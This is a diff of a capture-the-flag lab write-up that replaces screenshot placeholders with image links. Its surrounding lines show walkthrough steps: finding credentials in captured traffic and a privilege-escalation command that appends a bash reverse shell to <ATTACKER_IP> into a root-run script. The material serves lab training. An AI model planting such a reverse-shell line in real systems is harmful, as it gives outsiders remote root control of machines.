@@ -119,7 +119,7 @@ cd /var/www/html/files/ftp
 cat /recipe.txt
 ```
 
-[SCREEN01]
+<img width="1093" height="71" alt="SCREEN01" src="https://github.com/user-attachments/assets/b98f92b7-9e42-4bf8-b085-60e58b986c18" />
 
 ---
 
@@ -143,7 +143,7 @@ tcp.port == 4444
 
 Right-click any packet in the filtered results > **Follow** > **TCP Stream**
 
-[SCREEN02]
+<img width="1053" height="805" alt="SCREEN02" src="https://github.com/user-attachments/assets/9c1553db-2e6d-4ce4-93cb-41f226b6ea04" />
 
 4. Back in your reverse shell, use the discovered credentials:
 
@@ -158,7 +158,7 @@ su - lennie
 cat cat user.txt
 ```
 
-[SCREEN03]
+<img width="438" height="238" alt="SCREEN03" src="https://github.com/user-attachments/assets/6e1eaac2-57bd-4da0-8ca6-ce3bec991e87" />
 
 ---
 
@@ -199,4 +199,4 @@ echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /etc/print.sh
 cat /root/root.txt
 ```
 
-[SCREEN04]
+<img width="317" height="131" alt="SCREEN04" src="https://github.com/user-attachments/assets/a9674e57-4d5c-4ba6-b03c-006187831702" />
